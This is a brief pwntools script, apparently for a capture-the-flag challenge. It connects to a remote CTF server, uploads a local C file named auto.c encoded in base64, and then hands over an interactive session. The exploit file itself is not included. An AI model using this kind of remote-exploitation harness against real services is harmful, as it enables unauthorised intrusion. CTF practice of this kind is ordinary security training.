from pwn import *

r = remote("dfa.eatpwnnosleep.com", 9999)

r.sendlineafter("finish\n", "auto.c")
r.sendlineafter("base64 : ", open("auto.c", "rt").read().encode('base64').replace('\n', ''))

r.interactive()
